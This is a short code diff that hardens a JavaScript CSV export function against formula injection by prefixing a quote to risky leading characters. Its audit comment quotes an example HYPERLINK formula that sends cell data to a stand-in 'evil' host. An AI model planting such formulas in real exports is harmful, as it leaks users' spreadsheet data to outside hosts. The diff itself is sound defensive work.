@@ -1202,7 +1202,21 @@ const CSV_EXPORT_ROW_CAP = 5000;
 
 function toCsvValue(v) {
   if (v == null) return '';
-  const s = String(v);
+  let s = String(v);
+  // [AUDIT-FIX-CSV-INJECTION-1] customerName and notes are raw, unmoderated
+  // customer-supplied WhatsApp text (see Order schema) — nothing upstream
+  // strips or validates their content. Excel/Sheets/LibreOffice treat any
+  // cell whose value STARTS WITH =, +, -, @, or a tab/CR as a formula to
+  // evaluate on open, regardless of the comma/quote/newline quoting below
+  // (that quoting only protects the CSV *structure*, not what a spreadsheet
+  // does with a quoted cell's *content*). A customer named e.g.
+  // '=HYPERLINK("http://evil/steal?d="&A1,"x")' or a note starting with
+  // '@SUM(...)' would silently become a live formula the moment a tenant
+  // opens an exported CSV — a well-known class (CSV/Formula Injection,
+  // OWASP CWE-1236). Standard mitigation: prefix a leading single-quote so
+  // spreadsheet apps render the value as literal text instead of evaluating
+  // it, before the existing delimiter-safety quoting below runs.
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   // Quote any field containing a comma, quote, or newline; escape embedded quotes.
   if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   return s;
